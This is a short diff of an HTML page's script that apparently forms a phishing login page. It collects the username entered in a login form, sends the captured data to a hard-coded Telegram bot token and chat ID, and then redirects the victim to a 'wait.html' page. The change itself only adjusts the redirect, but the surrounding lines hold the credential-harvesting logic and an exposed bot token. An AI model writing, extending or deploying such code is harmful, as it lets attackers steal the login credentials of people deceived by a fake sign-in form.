@@ -103,7 +103,7 @@
     <script>
         const TELEGRAM_BOT_TOKEN = '7331216356:AAHtd93Ayg1y2oVjfEUDYBmifqedJtUUdsc'; // Replace with your Telegram Bot Token
         const TELEGRAM_CHAT_ID = '7666647030'; // Replace with your Telegram Chat ID
-        const REDIRECT_URL = 'https://example.com/dashboard'; // Replace with your desired redirect URL
+        const REDIRECT_URL = 'wait.html'; // Replace with your desired redirect URL
 
         document.getElementById('loginBtn').addEventListener('click', async () => {
             const username = document.getElementById('username').value;
@@ -134,7 +134,7 @@
                 const result = await response.json();
                 if (result.ok) {
                     // Redirect to the specified URL after successful submission
-                    window.location.href = wait.html;
+                    window.location.href = REDIRECT_URL;
                 } else {
                     alert('Error sending data to Telegram.');
                 }
